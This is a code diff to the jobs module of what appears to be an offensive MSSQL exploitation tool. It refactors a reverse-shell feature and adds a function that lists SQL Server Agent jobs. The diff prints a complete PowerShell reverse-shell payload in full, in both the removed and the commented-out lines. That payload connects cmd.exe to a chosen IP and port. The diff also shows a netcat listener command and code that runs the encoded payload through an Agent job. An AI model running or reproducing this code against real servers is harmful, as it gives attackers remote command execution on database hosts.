@@ -3,9 +3,10 @@
 
 import logging, time, subprocess, base64
 from Mssql import Mssql
-from Utils import cleanString, ErrorClass, checkOptionsGivenByTheUser, ErrorClass
+from Utils import cleanString, ErrorClass, checkOptionsGivenByTheUser, ErrorClass, runListenNC, getPSReverseShellCodeEncoded, getScreenSize
 from Constants import *
 from threading import Thread
+from texttable import Texttable
 
 class Jobs (Mssql):
 	'''
@@ -19,12 +20,30 @@ class Jobs (Mssql):
 	REQ_EXEC_JOB = "exec sp_start_job @job_name= '{0}'" #{0} name
 	REQ_DEL_JOB = "exec sp_delete_job @job_name=  '{0}'" #{0} name
 	REQ_GET_STATUS = "exec sp_help_job @JOB_NAME = '{0}', @job_aspect='JOB'" #{0} name
+	REQ_GET_JOBS = """SELECT job.job_id,
+						job.name,
+						job.description,
+						steps.step_name,
+						steps.subsystem,
+						steps.command,
+						SUSER_SNAME(job.owner_sid),
+						steps.proxy_id,
+						proxies.name as [proxy_account],
+						job.enabled,
+						steps.server,
+						job.date_created,
+						steps.last_run_date
+					FROM [msdb].[dbo].[sysjobs] job
+					INNER JOIN [msdb].[dbo].[sysjobsteps] steps
+					ON job.job_id = steps.job_id
+					left join [msdb].[dbo].[sysproxies] proxies
+					ON steps.proxy_id = proxies.proxy_id
+	"""
 	ERROR_ALREADY_EXISTS = "already exists"
 	LAST_RUN_OUTCOME = {'Failed':0, 'Succeeded':1, 'Canceled':3, 'Unknown':5} #Outcome of the job the last time it ran
-	LAST_RUN_OUTCOME_INV = {v: k for k, v in LAST_RUN_OUTCOME.items()}
-	R_SHELL_COMMAND_POWERSHELL_PAYLOAD = 'function ReverseShellClean {{if ($c.Connected -eq $true) {{$c.Close()}}; if ($p.ExitCode -ne $null) {{$p.Close()}}; exit; }};$a="{0}"; $port="{1}";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process ;$p.StartInfo.FileName="cmd.exe" ;$p.StartInfo.RedirectStandardInput=1 ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){{$out += $e.GetString($os.Read())}} $s.Write($e.GetBytes($out),0,$out.Length);$out=$null;$done=$false;while (-not $done) {{if ($c.Connected -ne $true) {{cleanup}} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) {{ $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {{break}}}}  if ($pos -gt 0){{ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {{ReverseShellClean}} else {{  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){{ $out += $e.GetString($os.Read());if ($out -eq $string) {{$out=" "}}}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}}}} else {{ReverseShellClean}}}};' #{0} IP, {1} port
-	R_SHELL_COMMAND_POWERSHELL = "powershell.exe -EncodedCommand {0}"#{0} powershell code base64 encoded
-	NC_CMD = "nc -l -v {0}" #{0} port
+	LAST_RUN_OUTCOME_INV = {v: k for k, v in list(LAST_RUN_OUTCOME.items())}
+	#R_SHELL_COMMAND_POWERSHELL_PAYLOAD = 'function ReverseShellClean {{if ($c.Connected -eq $true) {{$c.Close()}}; if ($p.ExitCode -ne $null) {{$p.Close()}}; exit; }};$a="{0}"; $port="{1}";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process ;$p.StartInfo.FileName="cmd.exe" ;$p.StartInfo.RedirectStandardInput=1 ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){{$out += $e.GetString($os.Read())}} $s.Write($e.GetBytes($out),0,$out.Length);$out=$null;$done=$false;while (-not $done) {{if ($c.Connected -ne $true) {{cleanup}} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) {{ $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {{break}}}}  if ($pos -gt 0){{ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {{ReverseShellClean}} else {{  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){{ $out += $e.GetString($os.Read());if ($out -eq $string) {{$out=" "}}}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}}}} else {{ReverseShellClean}}}};' #{0} IP, {1} port
+	#R_SHELL_COMMAND_POWERSHELL = "powershell.exe -EncodedCommand {0}"#{0} powershell code base64 encoded
 	
 	def __init__(self, args):
 		'''
@@ -210,18 +229,6 @@ class Jobs (Mssql):
 			return status
 		return True
 		
-	def __runListenNC__ (self,port=None):
-		'''
-		nc listen on the port
-		'''
-		ncCmd = self.NC_CMD.format(port)
-		try :
-			logging.info('Listening for a remote connection on the local port {0} with the command "{1}"'.format(port, ncCmd))
-			subprocess.call(ncCmd, shell=True)
-		except KeyboardInterrupt:
-			logging.info("Connection closed locally")
-			pass
-		
 	def getInteractiveReverseShell(self, localip, localport):
 		'''
 		Give you an interactive reverse shell with powershell command
@@ -229,9 +236,9 @@ class Jobs (Mssql):
 		Returns exception if error
 		'''
 		logging.info("The powershell reverse shell tries to connect to {0}:{1}".format(localip,localport))
-		a = Thread(None, self.__runListenNC__, None, (), {'port':localport})
+		a = Thread(None, runListenNC, None, (), {'port':localport})
 		a.start()
-		cmdAndPayload = self.R_SHELL_COMMAND_POWERSHELL.format(base64.b64encode("".join([c+'\x00' for c in self.R_SHELL_COMMAND_POWERSHELL_PAYLOAD.format(localip, localport)])))
+		cmdAndPayload = getPSReverseShellCodeEncoded(ip=localip, port=localport)
 		try :
 			status = self.createAndExecuteJob(cmd=cmdAndPayload, descritpion="MDAT", cmdType="CMDEXEC", serverName="(LOCAL)")
 			if isinstance(status,Exception):
@@ -255,12 +262,38 @@ class Jobs (Mssql):
 			self.args['print'].unknownNews("? (Job or cmd is still running)")
 		else :
 			self.args['print'].goodNews("OK")
+
+	def getJobs(self):
+		'''
+		Return all jobs as table
+		'''
+		data = self.executeRequest(self.REQ_GET_JOBS, noResult=False)
+		if isinstance(data, Exception):
+			logging.error("Impossible to get jobs: '{0}'".format(data))
+		return data
+
+	def printJobs(self):
+		'''
+		Print jobs
+		'''
+		columns = [("job_id","job_name","job_desc","step_name","subsystem","command","job_owner","proxy_id","proxy_account","enabled","server","date_created","last_run_date")]
+		data = self.getJobs()
+		data = columns + data
+		if isinstance(data, Exception):
+			logging.error("Impossible to print jobs: '{1}'".format(data))
+			return data
+		table = Texttable(max_width=getScreenSize()[0])
+		table.set_deco(Texttable.HEADER)
+		table.add_rows(data)
+		print(table.draw())
+		return True
+
 			
 def runJobsModule(args):
 	'''
 	Run the Jobs module
 	'''
-	if checkOptionsGivenByTheUser(args,["test-module", "exec", "reverse-shell"], checkAccount=True) == False : return EXIT_MISS_ARGUMENT
+	if checkOptionsGivenByTheUser(args,["test-module", "exec", "reverse-shell","print-jobs"], checkAccount=True) == False : return EXIT_MISS_ARGUMENT
 	cmdType = ""
 	jobs = Jobs(args)
 	jobs.connect()
@@ -287,6 +320,9 @@ def runJobsModule(args):
 	if args["reverse-shell"] != None: 
 		args['print'].title("Try to give you a reverse shell with SQL Server Agent Stored Procedures (Jobs)")
 		status = jobs.getInteractiveReverseShell(args['reverse-shell'][0], args['reverse-shell'][1])
+	if args["print-jobs"] != None:
+		args['print'].title("Print list of agent jobs")
+		jobs.printJobs()
 
 
 
